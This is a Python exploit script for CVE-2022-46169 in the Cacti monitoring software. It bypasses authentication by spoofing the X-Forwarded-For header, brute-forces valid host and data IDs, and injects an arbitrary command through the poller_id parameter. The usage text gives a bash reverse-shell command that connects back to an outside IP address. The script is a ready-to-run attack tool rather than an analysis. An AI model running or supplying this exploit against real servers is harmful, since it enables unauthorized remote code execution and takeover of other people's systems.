#!/usr/bin/python3

# CVE-2022-46169: https://www.exploit-db.com/exploits/51166
# Reference: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/
# Ruby Version: https://github.com/Habib0x0/CVE-2022-46169/
# Coded By: sha16

import requests, sys
from urllib.parse import quote

if __name__ == '__main__':
    if len(sys.argv) == 3:
        target = sys.argv[1]
        reverse_shell = quote(sys.argv[2])
        headers = {'X-Forwarded-For':'127.0.0.1'}
        url = 'http://{}/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=7'.format(target)
        res = requests.get(url, headers=headers)
        flag = False

        if 'FATAL: You are not authorized to use this service' not in res.text:
            print('[+] Authentication Bypassed!')
        else:
            print("[+] Authentication Bypass Failed.")
            print("[+] Not vulnerable or X-Forwarded-For value was wrong.")

        for i in range(1, 10+1):
            for f in range(1, 10+1):
                brute_url = 'http://{}/remote_agent.php?action=polldata&&local_data_ids[]={}&host_id={}&poller_id=1'.format(target, f, i)
                res = requests.get(brute_url, headers=headers)

                if "[]" not in res.text and ('uptime' in res.text or 'polling_time' in res.text):
                    print("[+] Found valid host_id: {}".format(i))
                    print("[+] Found valid local_data_ids[]: {}".format(f))
                    host_id = i
                    local_data_id = f
                    flag = True
                    break
                                    
            if flag:
                break

        print('[+] Sending payload!')
        rce_url = "http://{}/remote_agent.php?action=polldata&poller_id=;{}&host_id={}&local_data_ids[]={}".format(target, reverse_shell, host_id, local_data_id)
        res = requests.get(rce_url, headers=headers)
        print('[+] Payload sent! (Status: {})'.format(res.status_code))
        print('[+] Response Body: {}'.format(res.text))
        
    else:
        print('[+] Use: python3 {} <target-ip> <command>'.format(sys.argv[0]))
        print('[+] Example:') 
        print('    -> python3 {} 10.129.216.137 \'bash -c "bash -i >& /dev/tcp/10.10.14.120/443 0>&1"\''.format(sys.argv[0]))
